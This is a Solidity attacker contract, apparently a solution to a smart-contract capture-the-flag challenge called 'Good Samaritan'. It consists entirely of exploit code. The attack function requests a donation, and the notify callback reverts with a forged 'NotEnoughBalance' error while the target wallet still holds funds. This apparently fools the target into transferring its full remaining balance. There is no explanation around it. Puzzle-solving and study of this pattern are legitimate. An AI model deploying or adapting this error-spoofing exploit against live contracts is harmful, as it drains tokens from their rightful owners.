// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    function coin() external returns (address);

    function wallet() external returns (address);

    function requestDonation() external returns (bool);
}

interface ICoin {
    function balances(address) external returns (uint256);
}

contract GoodSamaritanAttacker {
    error NotEnoughBalance();

    ITarget private target;

    constructor(address _target) {
        target = ITarget(_target);
    }

    function attack() external {
        ITarget(target).requestDonation();
    }

    function notify(uint256) external {
        uint256 walletBalance = ICoin(target.coin()).balances(target.wallet());

        if (walletBalance > 0) {
            revert NotEnoughBalance();
        }
    }
}
